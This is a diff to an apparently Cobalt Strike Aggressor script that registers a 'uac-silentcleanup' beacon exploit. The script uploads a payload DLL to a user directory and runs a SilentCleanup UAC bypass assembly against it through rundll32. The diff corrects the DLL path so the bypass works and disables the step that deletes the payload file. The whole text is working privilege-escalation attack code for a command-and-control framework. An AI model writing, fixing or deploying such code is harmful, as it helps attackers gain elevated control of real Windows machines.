@@ -18,13 +18,13 @@ sub silentcleanup_exploit {
 	bupload_raw($1, "C:\\Users\\" . $user . "\\temp.dll", $payload);
 
 	# Task beacon to run exploit with rundll32 and the path to the dll
-	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup.exe"), "c:\\users\\" . $user . "temp.dll,Start");	
+	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup.exe"), "c:\\users\\" . $user . "\\temp.dll,Start");	
 
 	#handle staging
 	bstage($1, $null, $2);
 
 	# Remove file
 	sleep(15 * 1000);
-	brm($1, "C:\\Users\\" . $user . "\\temp.dll");
+	#brm($1, "C:\\Users\\" . $user . "\\temp.dll");
 }
 beacon_exploit_register("uac-silentcleanup", "t", &silentcleanup_exploit);
